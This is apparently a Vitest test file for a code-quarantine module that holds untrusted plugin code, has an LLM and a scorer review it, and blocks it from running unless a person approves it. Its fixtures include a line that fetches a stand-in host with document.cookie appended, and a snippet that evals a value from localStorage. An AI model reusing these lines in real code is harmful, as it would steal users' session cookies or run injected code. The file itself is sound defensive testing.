import { beforeEach, describe, expect, it, vi } from 'vitest'
import { acceptIntoHive, broodRecord, flagInBrood, holdInBrood, mayRunBee } from '@hypercomb/core'

const sig = (c: string): string => c.repeat(64)

const callModel = vi.fn()
const resolveProvider = vi.fn((_call?: unknown) => ({ id: 'openrouter:test' }))
vi.mock('../assistant/llm-dispatch.js', () => ({
  callModel: (call: unknown) => callModel(call),
  resolveProvider: (call: unknown) => resolveProvider(call),
}))

const { auditDraft, auditHeldBee, scanBrood, scanHeld, AUDIT_SYSTEM, DRAFT_AUDIT_SYSTEM } = await import('./brood-audit.js')

type Ioc = { get: (key: string) => unknown }

const hive = (options: { code?: string; jev?: unknown } = {}): void => {
  const store = {
    getBeeBytes: async () => new TextEncoder().encode(options.code ?? 'export const bee = 1'),
    putResource: async () => sig('f'),
  }
  ;(globalThis as { ioc?: Ioc }).ioc = {
    get: (key: string) => key === '@hypercomb.social/Store' ? store
      : key === '@hypercomb.social/JevDecision' ? options.jev
      : undefined,
  }
}

describe('auditing held code', () => {
  beforeEach(() => {
    callModel.mockReset()
    callModel.mockResolvedValue({ text: 'Reads localStorage and posts it offsite.\nRECOMMENDS: refuse', model: 'test-model', providerId: 'openrouter:test' })
  })

  it('records the reading and still leaves the code unable to run', async () => {
    const s = sig('a')
    await holdInBrood(s, { zone: 'stranger.example' })
    const after = await auditHeldBee(s)
    expect(after?.audits.at(-1)?.recommends).toBe('refuse')
    expect(after?.audits.at(-1)?.summary).toContain('Reads localStorage')
    expect(after?.ruling).toBeUndefined()
    expect(await mayRunBee(s)).toBe(false)
  })

  it('AN AUDIT THAT SAYS ACCEPT STILL DOES NOT ACCEPT', async () => {
    const s = sig('b')
    await holdInBrood(s)
    callModel.mockResolvedValue({ text: 'Harmless.\nRECOMMENDS: accept', model: 'test-model', providerId: 'openrouter:test' })
    await auditHeldBee(s)
    expect(await mayRunBee(s)).toBe(false)
    expect((await broodRecord(s))?.ruling).toBeUndefined()
    // Only the hand, with its two warnings, opens the door.
    await acceptIntoHive(s, ['not-safe', 'audit-is-not-approval'])
    expect(await mayRunBee(s)).toBe(true)
  })

  it('sends the code as fenced data, and says so in the system turn', async () => {
    const s = sig('c')
    await holdInBrood(s)
    await auditHeldBee(s)
    const call = callModel.mock.calls[0]?.[0] as { system: string; messages: { content: string }[] }
    expect(call.system).toBe(AUDIT_SYSTEM)
    expect(call.system).toMatch(/DATA/)
    expect(call.messages[0]?.content).toMatch(/<held-code signature="[0-9a-f]{64}">/)
  })

  it('lets JEV score the same material, and takes its verdict as a score only', async () => {
    const s = sig('d')
    await holdInBrood(s)
    // The decision as the table design returns it (jev-decision.ts JevResult):
    // a plan, not the retired `selected` field.
    const evaluate = vi.fn().mockResolvedValue({
      plan: { kind: 'do', row: 'accept', review: false }, rejected: [], reason: 'ok', model: 'jev',
      answers: { accept_fit: { type: 'noul', noul: 0.91 } },
    })
    hive({ jev: { ready: () => true, evaluate } })
    const after = await auditHeldBee(s)
    expect(evaluate).toHaveBeenCalled()
    expect(after?.audits.at(-1)?.scores).toEqual({ accept_fit: 0.91 })
    expect(after?.audits.at(-1)?.recommends).toBe('accept')
    expect(await mayRunBee(s)).toBe(false)
  })

  it('names the worker on the call, so JEV scores what that worker was shown — a result carries no provider', async () => {
    const s = sig('2')
    await holdInBrood(s)
    // The answer names no provider, exactly as callModel returns it.
    callModel.mockResolvedValue({ text: 'Harmless.\nRECOMMENDS: accept', model: 'test-model' })
    const evaluate = vi.fn().mockResolvedValue({ plan: { kind: 'do', row: 'refuse', review: false }, rejected: [], reason: 'ok', model: 'jev', answers: {} })
    const ready = vi.fn(() => true)
    hive({ jev: { ready, evaluate } })
    const after = await auditHeldBee(s)
    expect((callModel.mock.calls[0]?.[0] as { providerId?: string }).providerId).toBe('openrouter:test')
    expect(ready).toHaveBeenCalledWith('openrouter:test')
    expect(evaluate.mock.calls[0]?.[1]).toMatchObject({ providerId: 'openrouter:test' })
    expect(after?.audits.at(-1)?.recommends).toBe('refuse')
  })

  it('a reading that saw only part of the code never recommends letting it run', async () => {
    const s = sig('0')
    hive({ code: 'x'.repeat(5_000), jev: { ready: () => false, evaluate: vi.fn() } })
    await holdInBrood(s)
    callModel.mockResolvedValue({ text: 'Harmless.\nRECOMMENDS: accept', model: 'test-model' })
    const after = await auditHeldBee(s, { maxCodeChars: 1_000 })
    expect(after?.audits.at(-1)?.recommends).toBe('unclear')
  })

  it('stands on the agent reading alone when JEV is not available', async () => {
    const s = sig('e')
    await holdInBrood(s)
    hive({ jev: { ready: () => false, evaluate: vi.fn() } })
    const after = await auditHeldBee(s)
    expect(after?.audits.at(-1)?.scores).toBeUndefined()
    expect(after?.audits.at(-1)?.by).toBe('test-model')
  })

  it('refuses to read what is not held', async () => {
    await expect(auditHeldBee(sig('9'))).rejects.toThrow(/nothing is held/)
    expect(callModel).not.toHaveBeenCalled()
  })
})

describe('reading a draft before it runs — the draft audit', () => {
  const SECTION = 'src/games/solomon/labyrinth.ts'
  const BEFORE = ['// src/games/solomon/labyrinth.ts', 'var rooms = "remembered";', '// src/games/solomon/solomon.drone.ts', 'export {};'].join('\n')
  const AFTER = BEFORE.replace('var rooms = "remembered";', 'var rooms = await fetch("https://elsewhere.example/" + document.cookie);')
  const FROM = sig('1')

  /** A hive holding the module the draft was written from and the draft. */
  const draftHive = (draftSig: string, jev?: unknown): void => {
    const texts = new Map([[FROM, BEFORE], [draftSig, AFTER]])
    const store = {
      getBeeBytes: async (s: string) => texts.has(s) ? new TextEncoder().encode(texts.get(s)) : null,
      getDependencyBytes: async () => null,
      putResource: async () => sig('f'),
    }
    ;(globalThis as { ioc?: Ioc }).ioc = {
      get: (key: string) => key === '@hypercomb.social/Store' ? store : key === '@hypercomb.social/JevDecision' ? jev : undefined,
    }
  }
  const jevSays = (row: 'accept' | 'refuse') => ({
    ready: () => true,
    evaluate: vi.fn().mockResolvedValue({ plan: { kind: 'do', row, review: false }, rejected: [], reason: 'scored', model: 'jev', answers: {} }),
  })

  beforeEach(() => {
    callModel.mockReset()
    callModel.mockResolvedValue({ text: 'Sends the cookie to elsewhere.example.\nRECOMMENDS: refuse', model: 'test-model', providerId: 'openrouter:test' })
  })

  it('reads the change — before and after, fenced as data — and records it on the draft', async () => {
    const s = sig('3')
    draftHive(s)
    await holdInBrood(s, { kind: 'own', how: 'a draft' }, SECTION)
    callModel.mockResolvedValue({ text: 'Renames a room.\nRECOMMENDS: accept', model: 'test-model', providerId: 'openrouter:test' })
    const reading = await auditDraft({ sig: s, from: FROM, section: SECTION, reaches: [] })
    expect(reading).toMatchObject({ held: false, heldByReading: false, recommends: 'accept', summary: 'Renames a room.' })
    expect((await broodRecord(s))?.audits).toHaveLength(1)
    const call = callModel.mock.calls[0]?.[0] as { system: string; messages: { content: string }[] }
    expect(call.system).toBe(DRAFT_AUDIT_SYSTEM)
    const content = call.messages[0]!.content
    expect(content).toContain(`<code-before section="${SECTION}" signature="${FROM}">`)
    expect(content).toContain('remembered')
    expect(content).toContain(`<code-after section="${SECTION}" signature="${s}">`)
    expect(content).toContain('elsewhere.example')
    expect(await mayRunBee(s)).toBe(true)
  })

  it('a reader that recommends refusing it HOLDS it', async () => {
    const s = sig('4')
    draftHive(s)
    await holdInBrood(s, { kind: 'own' }, SECTION)
    const reading = await auditDraft({ sig: s, from: FROM, section: SECTION })
    expect(reading).toMatchObject({ held: true, heldByReading: true, recommends: 'refuse' })
    expect((await broodRecord(s))?.flags?.[0]).toMatchObject({ by: 'test-model', reason: 'Sends the cookie to elsewhere.example.' })
    expect(await mayRunBee(s)).toBe(false)
  })

  it('JEV refusing holds it even where the agent would let it run', async () => {
    const s = sig('5')
    draftHive(s, jevSays('refuse'))
    await holdInBrood(s, { kind: 'own' }, SECTION)
    callModel.mockResolvedValue({ text: 'Looks fine.\nRECOMMENDS: accept', model: 'test-model', providerId: 'openrouter:test' })
    const reading = await auditDraft({ sig: s, from: FROM, section: SECTION })
    expect(reading).toMatchObject({ heldByReading: true, by: 'jev' })
    expect((await broodRecord(s))?.flags?.[0]?.by).toBe('jev')
    expect(await mayRunBee(s)).toBe(false)
  })

  it('A READING CAN NEVER RELEASE WHAT THE SCAN HELD', async () => {
    const s = sig('6')
    draftHive(s, jevSays('accept'))
    await flagInBrood(s, { by: 'scan', reason: 'it newly reaches the network and stored data', reaches: ['network', 'storage'] })
    callModel.mockResolvedValue({ text: 'Harmless.\nRECOMMENDS: accept', model: 'test-model', providerId: 'openrouter:test' })
    const reading = await auditDraft({ sig: s, from: FROM, section: SECTION, reaches: ['network', 'storage'] })
    expect(reading).toMatchObject({ held: true, heldByReading: false, recommends: 'accept' })
    expect(await mayRunBee(s)).toBe(false)
    const content = (callModel.mock.calls[0]?.[0] as { messages: { content: string }[] }).messages[0]!.content
    expect(content).toContain('newly reaches the network and stored data')
  })

  it('reads the same draft once, and nothing the draft door never recorded', async () => {
    const s = sig('7')
    draftHive(s)
    await holdInBrood(s, { kind: 'own' }, SECTION)
    await auditDraft({ sig: s, from: FROM, section: SECTION })
    expect(await auditDraft({ sig: s, from: FROM, section: SECTION })).toBeNull()
    expect(await auditDraft({ sig: sig('8'), from: FROM, section: SECTION })).toBeNull()
    expect(callModel).toHaveBeenCalledTimes(1)
  })
})

beforeEach(() => { if (!(globalThis as { ioc?: Ioc }).ioc) hive() })
hive()

describe('the whole brood, scanned and read — brood scan', () => {
  beforeEach(() => {
    callModel.mockReset()
    callModel.mockResolvedValue({ text: 'Harmless.\nRECOMMENDS: accept', model: 'test-model' })
  })

  it('records what held code reaches, once, and leaves your own drafts to the draft door', async () => {
    hive({ code: 'const k = localStorage.getItem("x"); eval(k)', jev: { ready: () => false, evaluate: vi.fn() } })
    // A fresh signature per case: the brood cache lives for the file.
    const held = 'c1'.padEnd(64, '1')
    await holdInBrood(held, { zone: 'stranger.example' })
    const scanned = await scanHeld(held)
    expect(scanned?.audits.at(-1)).toMatchObject({ by: 'scan', reaches: ['storage', 'eval'] })
    expect(await scanHeld(held)).toBeNull()
    const draft = 'c2'.padEnd(64, '2')
    await holdInBrood(draft, { kind: 'own', how: 'a draft of src/x.ts at x' })
    expect(await scanHeld(draft)).toBeNull()
  })

  it('scans what was never scanned and reads what nobody read, a few per pass, never a ruled one', async () => {
    hive({ code: 'export const bee = 1', jev: { ready: () => false, evaluate: vi.fn() } })
    const ids = ['d1', 'd2', 'd3'].map(p => p.padEnd(64, p[1]!))
    for (const id of ids) await holdInBrood(id, { zone: 'stranger.example' })
    await acceptIntoHive(ids[2]!, ['not-safe', 'audit-is-not-approval'])
    const first = await scanBrood({ maxReads: 1 })
    expect(first.read).toBe(1)
    expect(first.unread).toBeGreaterThanOrEqual(1)
    const again = await scanBrood({ maxReads: 5 })
    expect(again.scanned).toBe(0)
    expect((await broodRecord(ids[2]!))?.audits).toEqual([])
    for (const id of ids.slice(0, 2)) expect((await broodRecord(id))?.audits.some(a => a.by === 'test-model')).toBe(true)
  })
})
